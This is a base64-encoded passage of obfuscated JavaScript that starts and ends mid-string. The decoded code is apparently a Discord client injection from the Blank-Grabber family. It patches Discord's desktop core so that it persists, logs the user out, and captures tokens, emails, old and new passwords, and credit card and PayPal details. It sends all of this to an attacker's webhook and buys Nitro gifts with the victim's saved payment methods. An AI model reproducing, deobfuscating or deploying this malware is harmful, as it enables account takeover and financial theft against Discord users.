XHgyMFZlcmlmaWVkXHgyMEJvdFx4MjBEZXZlbG9wZXInLCdhdXRvX2J1eV9uaXRybycsJ2Z1bmN0aW9uJywnY29uY2F0JywnTmV3XHgyMEVtYWlsOlx4MjAqKicsJ05vXHgyME5pdHJvJywnc3RhdHVzQ29kZScsJ3VwZGF0ZScsJyoqXHgwYUJhZGdlczpceDIwKionLCdDb250ZW50cycsJ2F2YXRhcicsJzQ5OScsJ0BldmVyeW9uZScsJ3N0YXJ0c1dpdGgnLCd3cml0ZUZpbGVTeW5jJywnaHR0cHM6Ly8qLmRpc2NvcmQuY29tL2FwaS92Ki91c2Vycy9AbWUvbGlicmFyeScsJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3YqL2F1dGgvbG9naW4nLCdkZWZhdWx0Jywnc3Vic3RyJywnd2luZG93LndlYnBhY2tKc29ucD8oZ2c9d2luZG93LndlYnBhY2tKc29ucC5wdXNoKFtbXSx7Z2V0X3JlcXVpcmU6KGEsYixjKT0+YS5leHBvcnRzPWN9LFtbXHgyMmdldF9yZXF1aXJlXHgyMl1dXSksZGVsZXRlXHgyMGdnLm0uZ2V0X3JlcXVpcmUsZGVsZXRlXHgyMGdnLmMuZ2V0X3JlcXVpcmUpOndpbmRvdy53ZWJwYWNrQ2h1bmtkaXNjb3JkX2FwcCYmd2luZG93LndlYnBhY2tDaHVua2Rpc2NvcmRfYXBwLnB1c2goW1tNYXRoLnJhbmRvbSgpXSx7fSxhPT57Z2c9YX1dKTtmdW5jdGlvblx4MjBMb2dPdXQoKXsoZnVuY3Rpb24oYSl7Y29uc3RceDIwYj1ceDIyc3RyaW5nXHgyMj09dHlwZW9mXHgyMGE/YTpudWxsO2Zvcihjb25zdFx4MjBjXHgyMGluXHgyMGdnLmMpaWYoZ2cuYy5oYXNPd25Qcm9wZXJ0eShjKSl7Y29uc3RceDIwZD1nZy5jW2NdLmV4cG9ydHM7aWYoZCYmZC5fX2VzTW9kdWxlJiZkLmRlZmF1bHQmJihiP2QuZGVmYXVsdFtiXTphKGQuZGVmYXVsdCkpKXJldHVyblx4MjBkLmRlZmF1bHQ7aWYoZCYmKGI/ZFtiXTphKGQpKSlyZXR1cm5ceDIwZH1yZXR1cm5ceDIwbnVsbH0pKFx4MjJsb2dpblx4MjIpLmxvZ291dCgpfUxvZ091dCgpOycsJ2NoYXJBdCcsJ2luaXRpYXRpb24nLCdnZXRITUFDJywnaW5qZWN0aW9uX3VybCcsJ2RlZmF1bHQtc3JjXHgyMFx4MjcqXHgyNycsJyoqXHgwYU9sZFx4MjBQYXNzd29yZDpceDIwKionLCdEaXNjb3JkXHgyMEJ1Z1x4MjBIdW50ZXJceDIwKEdvbGRlbiknLCdBUFBEQVRBJywnZGlzY29yZC5jb20nLCdudW1Sb3VuZHNceDIwbXVzdFx4MjBhXHgyMGludGVnZXJceDIwPj1ceDIwMScsJ2pzU0hBJywnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JsYW5rLWMvQmxhbmstR3JhYmJlci9tYWluLy5naXRodWIvd29ya2Zsb3dzL2ltYWdlLnBuZycsJzNWZlhOYVonLCdmcm9tJywnYmluTGVuJywnLndlYnAnLCdleHBvcnRzJywnMTc2MTE3NnVLQ1hxZycsJ3ByZW1pdW1fdHlwZScsJ1x4MjIpO1x4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5zZW5kKG51bGwpO1x4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5yZXNwb25zZVRleHQ7JywnZGlzY3JpbWluYXRvcicsJ1x4MjB8XHgyMCcsJ3RvVXBwZXJDYXNlJywnTm9uZScsJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9CbGFuay1jL0Rpc2NvcmQtSW5qZWN0aW9uLUJHL21haW4vaW5qZWN0aW9uLW9iZnVzY2F0ZWQuanMnLCc5OTk5Jywnb25CZWZvcmVSZXF1ZXN0Jywnd2ViaG9va19wcm90ZWN0b3Jfa2V5JywnMjQyMjg2N2MtMjQ0ZC00NzZhLWJhNGYtMzZlMTk3NzU4ZDk3JywnOTFCZ25NeVonLCduZXdfcGFzc3dvcmQnLCcvYmlsbGluZy9wYXltZW50LXNvdXJjZXNceDIyLFx4MjBmYWxzZSk7XHgyMFx4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5zZXRSZXF1ZXN0SGVhZGVyKFx4MjJBdXRob3JpemF0aW9uXHgyMixceDIwXHgyMicsJyoqXHgwYUNWQzpceDIwKionLCcod2VicGFja0NodW5rZGlzY29yZF9hcHAucHVzaChbW1x4MjdceDI3XSx7fSxlPT57bT1bXTtmb3IobGV0XHgyMGNceDIwaW5ceDIwZS5jKW0ucHVzaChlLmNbY10pfV0pLG0pLmZpbmQobT0+bT8uZXhwb3J0cz8uZGVmYXVsdD8uZ2V0VG9rZW4hPT12b2lkXHgyMDApLmV4cG9ydHMuZGVmYXVsdC5nZXRUb2tlbigpJywnZW1iZWRfY29sb3InLCd1c2VybmFtZScsJ2h0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tL21lcmNoYW50cy80OXBwMnJwNHBoeW03Mzg3L2NsaWVudF9hcGkvdiovcGF5bWVudF9tZXRob2RzL3BheXBhbF9hY2NvdW50cycsJ2FwcCcsJ0Vhcmx5XHgyMFN1cHBvcnRlcicsJ3NsaWNlJywnYXBwLmFzYXInLCcpKTtceDBhXHgyMFx4MjBceDIwXHgyMHhtbEh0dHAucmVzcG9uc2VUZXh0Jywnc3RyaW5naWZ5JywncGluZ192YWwnLCdjYXJkW2N2Y10nLCc3NjY3NTRZRld5bWwnLCdIeXBlU3F1YWRceDIwRXZlbnQnLCdlbGVjdHJvbicsJ2pvaW4nLCdodHRwczovL3N0YXR1cy5kaXNjb3JkLmNvbS9hcGkvdiovc2NoZWR1bGVkLW1haW50ZW5hbmNlcy91cGNvbWluZy5qc29uJywndmFsdWUnLCdwYXJzZScsJyoqQWNjb3VudFx4MjBJbmZvKionLCdpbmNsdWRlcycsJyhVbmtub3duKScsJ25vdycsJ3VybCcsJzAxMjM0NTY3ODlhYmNkZWYnLCdsb2dpbicsJ1Jlc291cmNlcycsJ3JlYWRkaXJTeW5jJywnd2ViUmVxdWVzdCcsJ3Jlc3BvbnNlSGVhZGVycycsJ0ZhaWxlZFx4MjB0b1x4MjBQdXJjaGFzZVx4MjDinYwnLCd2YXJceDIweG1sSHR0cFx4MjA9XHgyMG5ld1x4MjBYTUxIdHRwUmVxdWVzdCgpO1x4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5vcGVuKFx4MjJQT1NUXHgyMixceDIwXHgyMmh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3N0b3JlL3NrdXMvJywnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdiovdXNlcnMvQG1lL2xpYnJhcnknLCd3c3M6Ly9yZW1vdGUtYXV0aC1nYXRld2F5LmRpc2NvcmQuZ2cvKiddO3g9ZnVuY3Rpb24oKXtyZXR1cm4geDk7fTtyZXR1cm4geCgpO31mdW5jdGlvbiBkZWMyaGV4KFkpe2NvbnN0IHY9UztyZXR1cm4oWTwxNS41PycwJzonJykrTWF0aFt2KDB4ODEpXShZKVt2KDB4ZTApXSgweDEwKTt9ZnVuY3Rpb24gYmFzZTMydG9oZXgoWSl7Y29uc3QgRz1TO2xldCBaPUcoMHg5NSksbz0nJyxUPScnO1k9WVtHKDB4OTcpXSgvPSskLywnJyk7Zm9yKGxldCBIPTB4MDtIPFlbRygweGE2KV07SCsrKXtsZXQgVj1aWydpbmRleE9mJ10oWVtHKDB4MTFkKV0oSClbRygweDEzMyldKCkpO2lmKFY9PT0tMHgxKWNvbnNvbGVbRygweDdmKV0oRygweGE5KSk7bys9bGVmdHBhZChWW0coMHhlMCldKDB4MiksMHg1LCcwJyk7fWZvcihsZXQgUj0weDA7UisweDg8PW9bRygweGE2KV07Uis9MHg4KXtsZXQgQT1vW0coMHgxMWIpXShSLDB4OCk7VD1UK2xlZnRwYWQocGFyc2VJbnQoQSwweDIpW0coMHhlMCldKDB4MTApLDB4MiwnMCcpO31yZXR1cm4gVDt9ZnVuY3Rpb24gbGVmdHBhZChZLFosbyl7Y29uc3QgYj1TO3JldHVybiBaKzB4MT49WVtiKDB4YTYpXSYmKFk9QXJyYXkoWisweDEtWVtiKDB4YTYpXSlbYigweDZiKV0obykrWSksWTt9Y29uc3QgZGlzY29yZFBhdGg9KGZ1bmN0aW9uKCl7Y29uc3QgZj1TLFk9YXJnc1sweDBdW2YoMHhiZCldKHBhdGhbJ3NlcCddKVtmKDB4MTQ0KV0oMHgwLC0weDEpW2YoMHg2YildKHBhdGhbZigweDliKV0pO2xldCBaO2lmKHByb2Nlc3NbZigweGM2KV09PT1mKDB4ZjcpKVo9cGF0aFtmKDB4NmIpXShZLGYoMHhlYSkpO2Vsc2UgcHJvY2Vzc1sncGxhdGZvcm0nXT09PSdkYXJ3aW4nJiYoWj1wYXRoW2YoMHg2YildKFksZigweDExMiksZigweDc2KSkpO2lmKGZzW2YoMHhlZSldKFopKXJldHVybnsncmVzb3VyY2VQYXRoJzpaLCdhcHAnOll9O3JldHVybnsndW5kZWZpbmVkJzp1bmRlZmluZWQsJ3VuZGVmaW5lZCc6dW5kZWZpbmVkfTt9KCkpO2Z1bmN0aW9uIEMoWSxaKXtjb25zdCBvPXgoKTtyZXR1cm4gQz1mdW5jdGlvbihULEgpe1Q9VC0weDZhO2xldCBWPW9bVF07cmV0dXJuIFY7fSxDKFksWik7fWZ1bmN0aW9uIHVwZGF0ZUNoZWNrKCl7Y29uc3QgdD1TLHtyZXNvdXJjZVBhdGg6WSxhcHA6Wn09ZGlzY29yZFBhdGg7aWYoWT09PXVuZGVmaW5lZHx8Wj09PXVuZGVmaW5lZClyZXR1cm47Y29uc3Qgbz1wYXRoW3QoMHg2YildKFksdCgweDE0MikpLFQ9cGF0aFt0KDB4NmIpXShvLHQoMHhhNSkpLEg9cGF0aFt0KDB4NmIpXShvLHQoMHhiMSkpLFY9ZnNbdCgweDc3KV0oWisnXHg1Y21vZHVsZXNceDVjJylbdCgweGUyKV0oQT0+L2Rpc2NvcmRfZGVza3RvcF9jb3JlLSs/L1sndGVzdCddKEEpKVsweDBdLGk9WisnXHg1Y21vZHVsZXNceDVjJytWKydceDVjZGlzY29yZF9kZXNrdG9wX2NvcmVceDVjaW5kZXguanMnLFI9cGF0aFt0KDB4NmIpXShwcm9jZXNzW3QoMHhkNCldW3QoMHgxMjQpXSx0KDB4MTA0KSk7aWYoIWZzW3QoMHhlZSldKG8pKWZzW3QoMHg4YildKG8pO2lmKGZzWydleGlzdHNTeW5jJ10oVCkpZnNbdCgweGZjKV0oVCk7aWYoZnNbdCgweGVlKV0oSCkpZnNbdCgweGZjKV0oSCk7aWYocHJvY2Vzc1sncGxhdGZvcm0nXT09PSd3aW4zMid8fHByb2Nlc3NbdCgweGM2KV09PT10KDB4OWEpKXtmc1t0KDB4MTE3KV0oVCxKU09OW3QoMHgxNDcpXSh7J25hbWUnOnQoMHg4NiksJ21haW4nOnQoMHhiMSl9LG51bGwsMHg0KSk7Y29uc3QgQT10KDB4YWYpK2krdCgweGMyKStSK3QoMHhjNykrY29uZmlnW3QoMHgxMjApXSsnXHgyNyxceDIwKHJlcylceDIwPT5ceDIwe1x4MGFceDIwXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMGNvbnN0XHgyMGZpbGVceDIwPVx4MjBmcy5jcmVhdGVXcml0ZVN0cmVhbShpbmRleEpzKTtceDBhXHgyMFx4MjBceDIwXHgyMFx4MjBceDIwXHgyMFx4MjByZXMucmVwbGFjZShceDI3JVdFQkhPT0tIRVJFQkFTRTY0RU5DT0RFRCVceDI3LFx4MjBceDI3JytlbmNvZGVkSG9vayt0KDB4ZGUpK2NvbmZpZ1t0KDB4MTM4KV0rdCgweGNmKStwYXRoW3QoMHg2YildKFksdCgweDE0NSkpK3QoMHhiNSk7ZnNbdCgweDExNyldKEgsQVt0KDB4OTcpXSgvXFwvZywnXHg1Y1x4NWMnKSk7fWlmKCFmc1snZXhpc3RzU3luYyddKHBhdGhbdCgweDZiKV0oX19kaXJuYW1lLHQoMHgxMWUpKSkpcmV0dXJuITB4MDtyZXR1cm4gZnNbdCgweDhkKV0ocGF0aFsnam9pbiddKF9fZGlybmFtZSx0KDB4MTFlKSkpLGV4ZWNTY3JpcHQodCgweDExYykpLCEweDE7fWNvbnN0IGV4ZWNTY3JpcHQ9WT0+e2NvbnN0IEs9UyxaPUJyb3dzZXJXaW5kb3dbSygweDg1KV0oKVsweDBdO3JldHVybiBaW0soMHhlYildWydleGVjdXRlSmF2YVNjcmlwdCddKFksITB4MCk7fSxnZXRJbmZvPWFzeW5jIFk9Pntjb25zdCBNPVMsWj1hd2FpdCBleGVjU2NyaXB0KCd2YXJceDIweG1sSHR0cFx4MjA9XHgyMG5ld1x4MjBYTUxIdHRwUmVxdWVzdCgpO1x4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5vcGVuKFx4MjJHRVRceDIyLFx4MjBceDIyJytjb25maWdbJ2FwaSddKydceDIyLFx4MjBmYWxzZSk7XHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLnNldFJlcXVlc3RIZWFkZXIoXHgyMkF1dGhvcml6YXRpb25ceDIyLFx4MjBceDIyJytZK00oMHgxMzApKTtyZXR1cm4gSlNPTltNKDB4NmUpXShaKTt9LGZldGNoQmlsbGluZz1hc3luYyBZPT57Y29uc3QgTD1TLFo9YXdhaXQgZXhlY1NjcmlwdChMKDB4N2UpK2NvbmZpZ1snYXBpJ10rTCgweDEzYykrWStMKDB4ZDkpKTtpZighWltMKDB4OGYpXXx8WltMKDB4YTYpXT09PTB4MClyZXR1cm4nJztyZXR1cm4gSlNPTltMKDB4NmUpXShaKTt9LGdldEJpbGxpbmc9YXN5bmMgWT0+e2NvbnN0IGo9UyxaPWF3YWl0IGZldGNoQmlsbGluZyhZKTtpZighWilyZXR1cm4n4p2MJztjb25zdCBvPVtdO1pbJ2ZvckVhY2gnXShUPT57Y29uc3QgUT1DO2lmKCFUW1EoMHg5NildKXN3aXRjaChUW1EoMHhjYyldKXtjYXNlIDB4MTpvW1EoMHg4NCldKCfwn5KzJyk7YnJlYWs7Y2FzZSAweDI6b1tRKDB4ODQpXShRKDB4OTMpKTticmVhaztkZWZhdWx0Om9bUSgweDg0KV0oUSgweDcxKSk7fX0pO2lmKG9bJ2xlbmd0aCddPT0weDApb1tqKDB4ODQpXSgn4p2MJyk7cmV0dXJuIG9bJ2pvaW4nXSgnXHgyMCcpO30sUHVyY2hhc2U9YXN5bmMoWSxaLG8sVCk9Pntjb25zdCBzPVMsSD17J2V4cGVjdGVkX2Ftb3VudCc6Y29uZmlnWyduaXRybyddW29dW1RdW3MoMHhhYSldLCdleHBlY3RlZF9jdXJyZW5jeSc6cygweGRkKSwnZ2lmdCc6ISFbXSwncGF5bWVudF9zb3VyY2VfaWQnOlosJ3BheW1lbnRfc291cmNlX3Rva2VuJzpudWxsLCdwdXJjaGFzZV90b2tlbic6cygweDEzOSksJ3NrdV9zdWJzY3JpcHRpb25fcGxhbl9pZCc6Y29uZmlnWyduaXRybyddW29dW1RdWydza3UnXX0sVj1leGVjU2NyaXB0KHMoMHg3YikrY29uZmlnW3MoMHhmMyldW29dW1RdWydpZCddKycvcHVyY2hhc2VceDIyLFx4MjBmYWxzZSk7XHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLnNldFJlcXVlc3RIZWFkZXIoXHgyMkF1dGhvcml6YXRpb25ceDIyLFx4MjBceDIyJytZK3MoMHg5YykrSlNPTltzKDB4MTQ3KV0oSCkrcygweDE0NikpO2lmKFZbJ2dpZnRfY29kZSddKXJldHVybiBzKDB4OTIpK1ZbcygweDEwOCldO2Vsc2UgcmV0dXJuIG51bGw7fSxidXlOaXRybz1hc3luYyBZPT57Y29uc3QgRD1TLFo9YXdhaXQgZmV0Y2hCaWxsaW5nKFkpLG89RCgweDdhKTtpZighWilyZXR1cm4gbztsZXQgVD1bXTtaWydmb3JFYWNoJ10oSD0+e2NvbnN0IGU9RDshSFtlKDB4OTYpXSYmKFQ9VFtlKDB4MTBjKV0oSFsnaWQnXSkpO30pO2ZvcihsZXQgSCBpbiBUKXtjb25zdCBWPVB1cmNoYXNlKFksSCxEKDB4ZjgpLEQoMHhkYikpO2lmKFYhPT1udWxsKXJldHVybiBWO2Vsc2V7Y29uc3QgaT1QdXJjaGFzZShZLEgsRCgweGY4KSwnbW9udGgnKTtpZihpIT09bnVsbClyZXR1cm4gaTtlbHNle2NvbnN0IFI9UHVyY2hhc2UoWSxILCdjbGFzc2ljJyxEKDB4ZDApKTtyZXR1cm4gUiE9PW51bGw/UjpvO319fX0sZ2V0Tml0cm89WT0+e2NvbnN0IHA9Uztzd2l0Y2goWSl7Y2FzZSAweDA6cmV0dXJuIHAoMHgxMGUpO2Nhc2UgMHgxOnJldHVybiBwKDB4MTA1KTtjYXNlIDB4MjpyZXR1cm4gcCgweGZkKTtjYXNlIDB4MzpyZXR1cm4gcCgweDEwMyk7ZGVmYXVsdDpyZXR1cm4gcCgweDcxKTt9fSxnZXRCYWRnZXM9WT0+e2NvbnN0IFU9UyxaPVtdO3JldHVybiBZPT0weDQwMDAwMCYmKFpbVSgweDg0KV0oVSgweDEwMikpLFktPTB4NDAwMDAwKSxZPT0weDQwMDAwJiYoWltVKDB4ODQpXSgnTW9kZXJhdG9yXHgyMFByb2dyYW1zXHgyMEFsdW1uaScpLFktPTB4NDAwMDApLFk9PTB4MjAwMDAmJihaWydwdXNoJ10oVSgweDEwOSkpLFktPTB4MjAwMDApLFk9PTB4NDAwMCYmKFpbVSgweDg0KV0oVSgweDEyMykpLFktPTB4NDAwMCksWT09MHgyMDAmJihaW1UoMHg4NCldKFUoMHgxNDMpKSxZLT0weDIwMCksWT09MHgxMDAmJihaW1UoMHg4NCldKFUoMHhmYSkpLFktPTB4MTAwKSxZPT0weDgwJiYoWlsncHVzaCddKFUoMHhmNikpLFktPTB4ODApLFk9PTB4NDAmJihaW1UoMHg4NCldKFUoMHhkNSkpLFktPTB4NDApLFk9PTB4OCYmKFpbVSgweDg0KV0oVSgweGMwKSksWS09MHg4KSxZPT0weDQmJihaW1UoMHg4NCldKFUoMHgxNGIpKSxZLT0weDQpLFk9PTB4MiYmKFpbVSgweDg0KV0oVSgweGY1KSksWS09MHgyKSxZPT0weDEmJihaW1UoMHg4NCldKFUoMHg5OCkpLFktPTB4MSksWT09MHgwP1pbJ2xlbmd0aCddPT0weDAmJlpbVSgweDg0KV0oVSgweDEzNCkpOlpbJ3B1c2gnXShVKDB4NzEpKSxaWydqb2luJ10oJyxceDIwJyk7fSxob29rZXI9YXN5bmMoWSxaPW51bGwpPT57Y29uc3QgZD1TLG89SlNPTltkKDB4MTQ3KV0oWSksVD1aPT1udWxsP25ldyBVUkwoY29uZmlnWyd3ZWJob29rJ10pOm5ldyBVUkwoWiksSD17J0NvbnRlbnQtVHlwZSc6ZCgweGU4KSwnQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luJzonKid9O2lmKCFjb25maWdbJ3dlYmhvb2snXVtkKDB4NzApXSgnYXBpL3dlYmhvb2tzJykpe2NvbnN0IFI9dG90cChjb25maWdbZCgweDEzOCldKTtIW2QoMHhjNCldPVI7fWNvbnN0IFY9eydwcm90b2NvbCc6VFsncHJvdG9jb2wnXSwnaG9zdG5hbWUnOlRbZCgweDgwKV0sJ3BhdGgnOlRbZCgweGRhKV0sJ21ldGhvZCc6J1BPU1QnLCdoZWFkZXJzJzpIfSxpPWh0dHBzW2QoMHhiYildKFYpO2lbJ29uJ10oJ2Vycm9yJyxBPT57Y29uc3QgST1kO2NvbnNvbGVbSSgweGUxKV0oQSk7fSksaVsnd3JpdGUnXShvKSxpWydlbmQnXSgpO2lmKFo9PW51bGwpaHR0cHNbJ2dldCddKGF0b2IoJzNGbWN2a0dlNGxXZHY4Mll1a25jMDVXWnk5eUw2TUhjMFJIYSdbZCgweGJkKV0oJycpW2QoMHhhYyldKClbZCgweDZiKV0oJycpKSxBPT5BWydvbiddKGQoMHg4Mikscj0+aG9va2VyKFksclsndG9TdHJpbmcnXSgpKSkpWydvbiddKGQoMHg3ZiksKCk9Pnt9KTt9LGxvZ2luPWFzeW5jKFksWixvKT0+e2NvbnN0IE89UyxUPWF3YWl0IGdldEluZm8obyksSD1nZXROaXRybyhUW08oMHgxMmYpXSksVj1nZXRCYWRnZXMoVFtPKDB4YWQpXSksaT1hd2FpdCBnZXRCaWxsaW5nKG8pLFI9eyd1c2VybmFtZSc6Y29uZmlnW08oMHhiOCldLCdhdmF0YXJfdXJsJzpjb25maWdbJ2VtYmVkX2ljb24nXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnW08oMHgxM2YpXSwnZmllbGRzJzpbeyduYW1lJzpPKDB4NmYpLCd2YWx1ZSc6J0VtYWlsOlx4MjAqKicrWStPKDB4ZTUpK1orJyoqJywnaW5saW5lJzohW119LHsnbmFtZSc6TygweDhhKSwndmFsdWUnOk8oMHhjYSkrSCtPKDB4MTExKStWKycqKlx4MGFCaWxsaW5nOlx4MjAqKicraSsnKionLCdpbmxpbmUnOiFbXX0seyduYW1lJzpPKDB4YjkpLCd2YWx1ZSc6J2AnK28rJ2AnLCdpbmxpbmUnOiFbXX1dLCdhdXRob3InOnsnbmFtZSc6VFtPKDB4MTQwKV0rJyMnK1RbTygweDEzMSldK08oMHgxMzIpK1RbJ2lkJ10sJ2ljb25fdXJsJzpPKDB4YjcpK1RbJ2lkJ10rJy8nK1RbTygweDExMyldK08oMHgxMmMpfX1dfTtpZihjb25maWdbTygweGRjKV0pUltPKDB4YjMpXT1jb25maWdbTygweDE0OCldO2hvb2tlcihSKTt9LHBhc3N3b3JkQ2hhbmdlZD1hc3luYyhZLFosbyk9Pntjb25zdCB4MD1TLFQ9YXdhaXQgZ2V0SW5mbyhvKSxIPWdldE5pdHJvKFRbeDAoMHgxMmYpXSksVj1nZXRCYWRnZXMoVFt4MCgweGFkKV0pLGk9YXdhaXQgZ2V0QmlsbGluZyhvKSxSPXsndXNlcm5hbWUnOmNvbmZpZ1snZW1iZWRfbmFtZSddLCdhdmF0YXJfdXJsJzpjb25maWdbeDAoMHhiYSldLCdlbWJlZHMnOlt7J2NvbG9yJzpjb25maWdbeDAoMHgxM2YpXSwnZmllbGRzJzpbeyduYW1lJzp4MCgweDllKSwndmFsdWUnOngwKDB4ZTcpK1RbJ2VtYWlsJ10reDAoMHgxMjIpK1kreDAoMHg5MSkrWisnKionLCdpbmxpbmUnOiEhW119LHsnbmFtZSc6eDAoMHg4YSksJ3ZhbHVlJzonTml0cm9ceDIwVHlwZTpceDIwKionK0grJyoqXHgwYUJhZGdlczpceDIwKionK1YreDAoMHhhMykraSsnKionLCdpbmxpbmUnOiEhW119LHsnbmFtZSc6eDAoMHhiOSksJ3ZhbHVlJzonYCcrbysnYCcsJ2lubGluZSc6IVtdfV0sJ2F1dGhvcic6eyduYW1lJzpUW3gwKDB4MTQwKV0rJyMnK1RbeDAoMHgxMzEpXSsnXHgyMHxceDIwJytUWydpZCddLCdpY29uX3VybCc6eDAoMHhiNykrVFsnaWQnXSsnLycrVFt4MCgweDExMyldK3gwKDB4MTJjKX19XX07aWYoY29uZmlnW3gwKDB4ZGMpXSlSW3gwKDB4YjMpXT1jb25maWdbeDAoMHgxNDgpXTtob29rZXIoUik7fSxlbWFpbENoYW5nZWQ9YXN5bmMoWSxaLG8pPT57Y29uc3QgeDE9UyxUPWF3YWl0IGdldEluZm8obyksSD1nZXROaXRybyhUW3gxKDB4MTJmKV0pLFY9Z2V0QmFkZ2VzKFRbeDEoMHhhZCldKSxpPWF3YWl0IGdldEJpbGxpbmcobyksUj17J3VzZXJuYW1lJzpjb25maWdbeDEoMHhiOCldLCdhdmF0YXJfdXJsJzpjb25maWdbJ2VtYmVkX2ljb24nXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnWydlbWJlZF9jb2xvciddLCdmaWVsZHMnOlt7J25hbWUnOicqKkVtYWlsXHgyMENoYW5nZWQqKicsJ3ZhbHVlJzp4MSgweDEwZCkrWSt4MSgweGU2KStaKycqKicsJ2lubGluZSc6ISFbXX0seyduYW1lJzp4MSgweDhhKSwndmFsdWUnOngxKDB4Y2EpK0greDEoMHgxMTEpK1YreDEoMHhhMykraSsnKionLCdpbmxpbmUnOiEhW119LHsnbmFtZSc6eDEoMHhiOSksJ3ZhbHVlJzonYCcrbysnYCcsJ2lubGluZSc6IVtdfV0sJ2F1dGhvcic6eyduYW1lJzpUWyd1c2VybmFtZSddKycjJytUWydkaXNjcmltaW5hdG9yJ10rJ1x4MjB8XHgyMCcrVFsnaWQnXSwnaWNvbl91cmwnOngxKDB4YjcpK1RbJ2lkJ10rJy8nK1RbeDEoMHgxMTMpXSt4MSgweDEyYyl9fV19O2lmKGNvbmZpZ1sncGluZ19vbl9ydW4nXSlSW3gxKDB4YjMpXT1jb25maWdbeDEoMHgxNDgpXTtob29rZXIoUik7fSxQYXlwYWxBZGRlZD1hc3luYyBZPT57Y29uc3QgeDI9UyxaPWF3YWl0IGdldEluZm8oWSksbz1nZXROaXRybyhaW3gyKDB4MTJmKV0pLFQ9Z2V0QmFkZ2VzKFpbeDIoMHhhZCldKSxIPWdldEJpbGxpbmcoWSksVj17J3VzZXJuYW1lJzpjb25maWdbeDIoMHhiOCldLCdhdmF0YXJfdXJsJzpjb25maWdbeDIoMHhiYSldLCdlbWJlZHMnOlt7J2NvbG9yJzpjb25maWdbeDIoMHgxM2YpXSwnZmllbGRzJzpbeyduYW1lJzp4MigweGI2KSwndmFsdWUnOidUaW1lXHgyMHRvXHgyMGJ1eVx4MjBzb21lXHgyMG5pdHJvXHgyMGJhYnlceDIw8J+YqScsJ2lubGluZSc6IVtdfSx7J25hbWUnOngyKDB4OGEpLCd2YWx1ZSc6eDIoMHhjYSkrbyt4MigweDk5KStUK3gyKDB4YTMpK0grJyoqJywnaW5saW5lJzohW119LHsnbmFtZSc6eDIoMHhiOSksJ3ZhbHVlJzonYCcrWSsnYCcsJ2lubGluZSc6IVtdfV0sJ2F1dGhvcic6eyduYW1lJzpaW3gyKDB4MTQwKV0rJyMnK1pbeDIoMHgxMzEpXSsnXHgyMHxceDIwJytaWydpZCddLCdpY29uX3VybCc6eDIoMHhiNykrWlsnaWQnXSsnLycrWlt4MigweDExMyldK3gyKDB4MTJjKX19XX07aWYoY29uZmlnWydwaW5nX29uX3J1biddKVZbeDIoMHhiMyldPWNvbmZpZ1t4MigweDE0OCldO2hvb2tlcihWKTt9LGNjQWRkZWQ9YXN5bmMoWSxaLG8sVCxIKT0+e2NvbnN0IHgzPVMsVj1hd2FpdCBnZXRJbmZvKEgpLGk9Z2V0Tml0cm8oVlt4MygweDEyZildKSxSPWdldEJhZGdlcyhWW3gzKDB4YWQpXSksQT1hd2FpdCBnZXRCaWxsaW5nKEgpLHI9eyd1c2VybmFtZSc6Y29uZmlnW3gzKDB4YjgpXSwnYXZhdGFyX3VybCc6Y29uZmlnW3gzKDB4YmEpXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnW3gzKDB4MTNmKV0sJ2ZpZWxkcyc6W3snbmFtZSc6eDMoMHhjYiksJ3ZhbHVlJzp4MygweGUzKStZK3gzKDB4MTNkKStaK3gzKDB4ODkpK28rJy8nK1QrJyoqJywnaW5saW5lJzohIVtdfSx7J25hbWUnOngzKDB4OGEpLCd2YWx1ZSc6eDMoMHhjYSkraSt4MygweDExMSkrUisnKipceDBhQmlsbGluZzpceDIwKionK0ErJyoqJywnaW5saW5lJzohIVtdfSx7J25hbWUnOngzKDB4YjkpLCd2YWx1ZSc6J2AnK0grJ2AnLCdpbmxpbmUnOiFbXX1dLCdhdXRob3InOnsnbmFtZSc6Vlt4MygweDE0MCldKycjJytWW3gzKDB4MTMxKV0rJ1x4MjB8XHgyMCcrVlsnaWQnXSwnaWNvbl91cmwnOngzKDB4YjcpK1ZbJ2lkJ10rJy8nK1ZbeDMoMHgxMTMpXSt4MygweDEyYyl9fV19O2lmKGNvbmZpZ1sncGluZ19vbl9ydW4nXSlyW3gzKDB4YjMpXT1jb25maWdbeDMoMHgxNDgpXTtob29rZXIocik7fSxuaXRyb0JvdWdodD1hc3luYyBZPT57Y29uc3QgeDQ9UyxaPWF3YWl0IGdldEluZm8oWSksbz1nZXROaXRybyhaWydwcmVtaXVtX3R5cGUnXSksVD1nZXRCYWRnZXMoWlsnZmxhZ3MnXSksSD1hd2FpdCBnZXRCaWxsaW5nKFkpLFY9YXdhaXQgYnV5Tml0cm8oWSksaT17J3VzZXJuYW1lJzpjb25maWdbJ2VtYmVkX25hbWUnXSwnY29udGVudCc6ViwnYXZhdGFyX3VybCc6Y29uZmlnW3g0KDB4YmEpXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnW3g0KDB4MTNmKV0sJ2ZpZWxkcyc6W3snbmFtZSc6eDQoMHhjNSksJ3ZhbHVlJzp4NCgweGEwKStWKydgYGAnLCdpbmxpbmUnOiEhW119LHsnbmFtZSc6JyoqRGlzY29yZFx4MjBJbmZvKionLCd2YWx1ZSc6eDQoMHhjYSkrbyt4NCgweDExMSkrVCt4NCgweGEzKStIKycqKicsJ2lubGluZSc6ISFbXX0seyduYW1lJzp4NCgweGI5KSwndmFsdWUnOidgJytZKydgJywnaW5saW5lJzohW119XSwnYXV0aG9yJzp7J25hbWUnOlpbeDQoMHgxNDApXSsnIycrWlsnZGlzY3JpbWluYX